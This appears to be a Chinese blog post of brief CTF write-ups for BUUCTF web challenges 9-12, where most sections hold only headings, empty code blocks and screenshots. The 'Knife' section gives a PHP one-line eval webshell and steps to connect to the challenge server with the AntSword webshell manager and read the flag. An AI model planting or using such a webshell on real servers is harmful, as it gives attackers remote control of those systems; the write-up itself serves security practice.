---
title: Buuctf Web（9-12）
date: 2023-08-08 21:24:46
tags: CTF
---

### Buuctf Web（9-12）

#### 9、Secret File



```text

```

#### 10、LoveSQL





```text

```

#### 11、Http







![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/06269527-d670-4189-8c9f-dc64374f0ec7)





![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/b1b7a270-fb3d-4019-b4e7-6e174ce633a5)

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/d6d19f27-7902-4f41-b3d7-741661d1f670)



 

 

```text

```

#### 12、Knife

使用蚁剑，安装教程[渗透工具：蚁剑教学 （安装+入门） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/367151320)

构造payload：`/?<?php eval($_POST["Syc"]);?>`

打开蚁剑添加数据

URL地址为：http://21ba1697-4914-4f56-9ca9-476b0434b666.node4.buuoj.cn:81/index.php

密码为：Syc


![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/a5d48bbb-ca0c-4d60-b454-26db354904e8)

测试连接，连接成功，再点击添加

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/e67424e4-dc4f-4d33-b1fa-ae6cd779970f)

右键单击，选择文件管理

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa)

查看根目录，发现有个flag



双击查看，得到flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270)

```text

```
